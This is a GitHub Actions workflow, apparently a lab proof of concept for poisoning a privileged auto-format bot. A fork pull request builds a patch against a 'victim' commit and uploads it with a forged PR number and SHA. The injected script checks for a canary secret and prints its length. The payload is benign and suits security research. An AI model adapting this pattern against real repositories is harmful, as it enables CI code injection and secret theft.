name: Auto Format (Build)
on:
  pull_request:
    branches: [production]
permissions:
  contents: read
env:
  VICTIM_PR: "3"
  VICTIM_SHA: "f93605c50dfec8d624652b5df36a892b54d2b62b"
jobs:
  build-patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          repository: ${{ github.repository }}
          ref: ${{ env.VICTIM_SHA }}
          persist-credentials: false
      - name: Build a benign patch against the victim commit
        run: |
          set -euo pipefail
          echo '// PoC: line added by fork PR via auto-format bot' >> src/demo.ts
          cat > bin/lab-step.mjs <<'EOF'
          console.log("lab-step: POC MARKER - code supplied by fork PR");
          console.log("lab-step: canary secret present in env:",
            Boolean(process.env.CANARY_SECRET),
            "length:", (process.env.CANARY_SECRET || "").length);
          EOF
          git add -A
          mkdir -p "$RUNNER_TEMP/auto-format"
          git diff --staged > "$RUNNER_TEMP/auto-format/format.patch"
          echo "$VICTIM_PR" > "$RUNNER_TEMP/auto-format/pr-number.txt"
          echo "$VICTIM_SHA" > "$RUNNER_TEMP/auto-format/head-sha.txt"
          cat "$RUNNER_TEMP/auto-format/format.patch"
      - uses: actions/upload-artifact@v4
        with:
          name: format-patch
          path: ${{ runner.temp }}/auto-format/
          retention-days: 1
